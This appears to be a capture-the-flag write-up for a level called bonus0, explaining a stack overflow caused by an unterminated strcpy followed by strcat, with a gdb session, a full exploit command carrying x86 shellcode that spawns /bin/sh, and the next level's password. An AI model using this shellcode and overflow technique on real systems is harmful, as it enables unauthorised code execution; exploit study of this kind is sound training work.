When analyzing the binary with gdb, we find that we cannot overflow the read buffer because it tries to dereference the return value of `strchr` on a \n (which causes an unexploitable segmentation fault).

But this huge buffer in the stack in the `p` function tells us we can easily put a shellcode in there and try to jump on it. But how ?

The binary does a strcpy of the 20 first chars of the first read. But if our read is 20 characters long, the buffer wont contain a 0 at then end, and the strcpy will copy more than it should (it will copy the buffer 2 too). \
Then it writes a space character on one byte, and strcat the second string on the result. The `eip` of main is located a few bytes after the main buffer. As we can write around 20 bytes after the end of the main buffer, we can override the eip to jump to our desired location in the stack.

Let's see how we did this:
```shell
$ # we must unset LINES and COLUMNS from the environment to make the process easier when executing in the shell
(gdb) disas p

$ # we break just after the read
(gdb) b *p+50

(gdb) r < <(python -c 'print "\x90"*100 + "AAAA"'; python -c 'print "CCCC"*5')

(gdb) x/48wx $esp
0xbfffe650:  0x00000000  0xbfffe660  0x00001000  0x00000000
0xbfffe660:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe670:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe680:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe690:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe6a0:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe6b0:  0x90909090  0x90909090  0x90909090  0x90909090
0xbfffe6c0:  0x90909090  0x41414141  0x0000000a  0x00000000
                        |_ where the shellcode will be inserted

(gdb) quit

bash$ # the shellcode must keep stdin open so we chose one that does it
bash$ # we take an address a little before so we are sure it gets executed properly (NOP instructions)
bash$ # the last byte is first because the insertion of the space will cause the data to be moved 1 byte to the right
bash$ ./bonus0 < <(python -c 'print "\x90"*100 + "\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' ; python -c 'print "\xbf\xb0\xe6\xff"*5')
 -
 -
������������������������������������������ ����������������������
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

